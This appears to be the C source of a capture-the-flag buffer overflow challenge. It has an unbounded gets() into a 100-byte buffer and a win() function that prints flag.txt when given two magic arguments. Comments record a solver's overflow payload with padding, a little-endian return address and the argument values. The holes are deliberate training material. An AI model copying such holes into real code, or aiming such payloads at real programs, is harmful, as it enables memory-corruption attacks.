#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  printf("Going in..\n");

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D) // 0xcafef00d 'A' * 112 + '\x96\x92\x04\x08' + 'A' * 4 +'\x0d\xf0\xfe\xca'+'\x0d\xf0\x0d\xf0'
    return;
  if (arg2 != 0xF00DF00D) // 4027445261 
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

// 0x08049296 \x96\x92\x04\x08
// 0x0804931e \x1e\x93\x04\x08

// 0x080491f6 print 'A' * 112 + '\xf6\x91\x04\x08'
